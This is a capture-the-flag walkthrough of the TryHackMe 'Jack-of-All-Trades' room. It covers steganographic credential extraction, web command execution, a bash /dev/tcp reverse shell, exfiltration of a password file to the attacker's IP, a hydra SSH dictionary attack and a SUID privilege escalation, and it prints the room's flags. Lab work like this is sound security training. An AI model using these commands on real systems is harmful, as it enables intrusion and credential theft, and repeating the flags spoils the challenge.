| Category          | Details                                                          |
|-------------------|------------------------------------------------------------------|
| 📝 **Name**       | [Jack-of-All-Trades](https://tryhackme.com/room/jackofalltrades) |  
| 🏷 **Type**       | THM Challenge                                                    |
| 🖥 **OS**         | Linux                                                            |
| 🎯 **Difficulty** | Easy                                                             |
| 📁 **Tags**       | Steganography, SSH dictionary attack, SUID strings               |

## Task 1: Flags

### User Flag

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM Jack-of-All-Trades]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-06 17:43 +0100
Nmap scan report for 10.80.139.65
Host is up (0.038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Jack-of-all-trades!
|_http-server-header: Apache/2.4.10 (Debian)
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.52 seconds
```

#### Enter main web page
```
┌──(magicrc㉿perun)-[~/attack/THM Jack-of-All-Trades]
└─$ curl http://$TARGET:22                                                            
<html>
        <head>
                <title>Jack-of-all-trades!</title>
                <link href="assets/style.css" rel=stylesheet type=text/css>
        </head>
        <body>
                <img id="header" src="assets/header.jpg" width=100%>
                <h1>Welcome to Jack-of-all-trades!</h1>
                <main>
                        <p>My name is Jack. I'm a toymaker by trade but I can do a little of anything -- hence the name!<br>I specialise in making children's toys (no relation to the big man in the red suit - promise!) but anything you want, feel free to get in contact and I'll see if I can help you out.</p>
                        <p>My employment history includes 20 years as a penguin hunter, 5 years as a police officer and 8 months as a chef, but that's all behind me. I'm invested in other pursuits now!</p>
                        <p>Please bear with me; I'm old, and at times I can be very forgetful. If you employ me you might find random notes lying around as reminders, but don't worry, I <em>always</em> clear up after myself.</p>
                        <p>I love dinosaurs. I have a <em>huge</em> collection of models. Like this one:</p>
                        <img src="assets/stego.jpg">
                        <p>I make a lot of models myself, but I also do toys, like this one:</p>
                        <img src="assets/jackinthebox.jpg">
                        <!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
                        <!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
                        <p>I hope you choose to employ me. I love making new friends!</p>
                        <p>Hope to see you soon!</p>
                        <p id="signature">Jack</p>
                </main>
        </body>
</html>
```
In HTML content we can read:
- `stego.jpg`, name of this image suggests some data embedded with steganography
- `/recovery.php` HTTP endpoint
- base64 encoded message

#### Decode base64 encoded message
```
┌──(magicrc㉿perun)-[~/attack/THM Jack-of-All-Trades]
└─$ echo UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== | base64 -d
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```

#### Download `stego.jpg`
```
┌──(magicrc㉿perun)-[~/attack/THM Jack-of-All-Trades]
└─$ wget http://$TARGET:22/assets/stego.jpg
--2026-01-06 17:51:14--  http://10.80.139.65:22/assets/stego.jpg
Connecting to 10.80.139.65:22... connected.
HTTP request sent, awaiting response... 200 OK
Length: 38015 (37K) [image/jpeg]
Saving to: ‘stego.jpg’

stego.jpg                                        100%[==========================================================================================================>]  37.12K  --.-KB/s    in 0.04s   

2026-01-06 17:51:14 (887 KB/s) - ‘stego.jpg’ saved [38015/38015]
```

#### Extract file embedded in `stego.jpg` using discovered password
```
┌──(magicrc㉿perun)-[~/attack/THM Jack-of-All-Trades]
└─$ steghide --extract -sf stego.jpg -p u?WtKSraq
wrote extracted data to "creds.txt".
```

#### Read file extracted file 
```
┌──(magicrc㉿perun)-[~/attack/THM Jack-of-All-Trades]
└─$ cat creds.txt 
Hehe. Gotcha!

You're on the right path, but wrong image!
```
Vector seems to be correct, but we need try with another image.

#### Download `header.jpg`
```
┌──(magicrc㉿perun)-[~/attack/THM Jack-of-All-Trades]
└─$ wget http://$TARGET:22/assets/header.jpg       
--2026-01-06 18:46:42--  http://10.80.139.65:22/assets/header.jpg
Connecting to 10.80.139.65:22... connected.
HTTP request sent, awaiting response... 200 OK
Length: 70273 (69K) [image/jpeg]
Saving to: ‘header.jpg’

header.jpg                                  100%[=========================================================================================>]  68.63K  --.-KB/s    in 0.09s   

2026-01-06 18:46:42 (761 KB/s) - ‘header.jpg’ saved [70273/70273]
```

#### Extract file embedded in `header.jpg` using same password
```
┌──(magicrc㉿perun)-[~/attack/THM Jack-of-All-Trades]
└─$ steghide --extract -sf header.jpg -p 'u?WtKSraq'
wrote extracted data to "cms.creds".
```

#### Read file extracted file 
```
┌──(magicrc㉿perun)-[~/attack/THM Jack-of-All-Trades]
└─$ cat cms.creds                                  
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: TplFxiSHjY
```
We have found credentials, now we need to find place where we could use them. Since we are unable to access target over SSH with those credentials, we could try `/recovery.php`. 

#### Access `/recovery.php` endpoint
```
┌──(magicrc㉿perun)-[~/attack/THM Jack-of-All-Trades]
└─$ curl http://$TARGET:22/recovery.php                                                      

<!DOCTYPE html>
<html>
        <head>
                <title>Recovery Page</title>
                <style>
                        body{
                                text-align: center;
                        }
                </style>
        </head>
        <body>
                <h1>Hello Jack! Did you forget your machine password again?..</h1>
                <form action="/recovery.php" method="POST">
                        <label>Username:</label><br>
                        <input name="user" type="text"><br>
                        <label>Password:</label><br>
                        <input name="pass" type="password"><br>
                        <input type="submit" value="Submit">
                </form>
                <!-- GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=  -->
                 
        </body>
</html>
```
We have found login panel. There is also base32, HEX and ROT13 encoded message which is basically hint that credentials are hidden on the main page with steganography. 

#### Use discovered credentials to login to `/recovery.php` 
```
┌──(magicrc㉿perun)-[~/attack/THM Jack-of-All-Trades]
└─$ curl -v -c cookies.txt http://$TARGET:22/recovery.php -d 'user=jackinthebox&pass=TplFxiSHjY' 
*   Trying 10.80.139.65:22...
* Connected to 10.80.139.65 (10.80.139.65) port 22
* using HTTP/1.x
> POST /recovery.php HTTP/1.1
> Host: 10.80.139.65:22
> User-Agent: curl/8.15.0
> Accept: */*
> Content-Length: 33
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 33 bytes
< HTTP/1.1 302 Found
< Date: Tue, 06 Jan 2026 17:53:55 GMT
< Server: Apache/2.4.10 (Debian)
* Added cookie PHPSESSID="0754qln73rhn0kjapc58blfpm1" for domain 10.80.139.65, path /, expire 0
< Set-Cookie: PHPSESSID=0754qln73rhn0kjapc58blfpm1; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Pragma: no-cache
* Added cookie login="jackinthebox%3Aa78e6e9d6f7b9d0abe0ea866792b7d84" for domain 10.80.139.65, path /, expire 1767894835
< Set-Cookie: login=jackinthebox%3Aa78e6e9d6f7b9d0abe0ea866792b7d84; expires=Thu, 08-Jan-2026 17:53:55 GMT; Max-Age=172800
< location: /nnxhweOV/index.php
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host 10.80.139.65 left intact
```
We are being forwarded to `/nnxhweOV/index.php`

#### Access `/nnxhweOV/index.php`
```
┌──(magicrc㉿perun)-[~/attack/THM Jack-of-All-Trades]
└─$ curl -b cookies.txt http://$TARGET:22/nnxhweOV/index.php
GET me a 'cmd' and I'll run it for you Future-Jack.
```
There is another hint which states that command passed in `cmd` HTTP GET param will be executed on target.

#### Pass `id` in `cmd` HTTP GET
```
┌──(magicrc㉿perun)-[~/attack/THM Jack-of-All-Trades]
└─$ curl -b cookies.txt http://$TARGET:22/nnxhweOV/index.php?cmd=id
GET me a 'cmd' and I'll run it for you Future-Jack.
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data) 
```
This confirms that we can execute arbitrary commands on target.

#### Start `nc` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/THM Jack-of-All-Trades]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

#### Spawn reverse shell connection using `cmd` HTTP GET param
```
┌──(magicrc㉿perun)-[~/attack/THM Jack-of-All-Trades]
└─$ CMD=$(echo "/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'" | jq -sRr @uri)
curl -b cookies.txt http://$TARGET:22/nnxhweOV/index.php?cmd=$CMD
```

#### Confirm foothold gained
```
connect to [192.168.132.170] from (UNKNOWN) [10.80.139.65] 50756
bash: cannot set terminal process group (710): Inappropriate ioctl for device
bash: no job control in this shell
www-data@jack-of-all-trades:/var/www/html/nnxhweOV$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Discover `/home/jacks_password_list` file with (most probably) passwords for user `jack`
```
www-data@jack-of-all-trades:/var/www/html/nnxhweOV$ cat /home/jacks_password_list                      
*hclqAzj+2GC+=0K
eN<A@n^zI?FE$I5,
X<(@zo2XrEN)#MGC
,,aE1K,nW3Os,afb
ITMJpGGIqg1jn?>@
<SNIP>
```

#### Exfiltrate `/home/jacks_password_list` using `nc` server and raw TCP socket
```
┌──(magicrc㉿perun)-[~/attack/THM Jack-of-All-Trades]
└─$ nc -lvnp 80 > jacks_password_list
listening on [any] 80 ...
```
```
www-data@jack-of-all-trades:/var/www/html/nnxhweOV$ exec 3<>/dev/tcp/192.168.132.170/80 && cat /home/jacks_password_list >&3 && exec 3>&-
```

#### Use `hydra` to conduct dictionary attack with `jacks_password_list` against user `jack` over SSH
```
┌──(magicrc㉿perun)-[~/attack/THM Jack-of-All-Trades]
└─$ hydra -I -l jack -P jacks_password_list ssh://$TARGET:80
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-06 19:05:43
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:1/p:24), ~2 tries per task
[DATA] attacking ssh://10.80.139.65:80/
[80][ssh] host: 10.80.139.65   login: jack   password: ITMJpGGIqg1jn?>@
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-06 19:05:47
```

#### Access target over SSH using discovered credentials
```
┌──(magicrc㉿perun)-[~/attack/THM Jack-of-All-Trades]
└─$ ssh jack@$TARGET -p 80
<SNIP>
jack@10.80.139.65's password: 
jack@jack-of-all-trades:~$ id
uid=1000(jack) gid=1000(jack) groups=1000(jack),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),115(bluetooth),1001(dev) 
```

#### Capture user flag
```
┌──(magicrc㉿perun)-[~/attack/THM Jack-of-All-Trades]
└─$ scp -P 80 jack@$TARGET:~/user.jpg .
```
Read flag from `user.jpg` image:
> `securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41e3}`

### Root Flag

#### Discover `/usr/bin/strings` with SUID permission
SUID permission has been discovered with `linpeas`
```
jack@jack-of-all-trades:~$ ls -l /usr/bin/strings 
-rwsr-x--- 1 root dev 27536 Feb 25  2015 /usr/bin/strings
```

#### Capture root flag
```
jack@jack-of-all-trades:~$ strings /root/root.txt | grep -oP securi-tay2020_{.+}
securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}
```
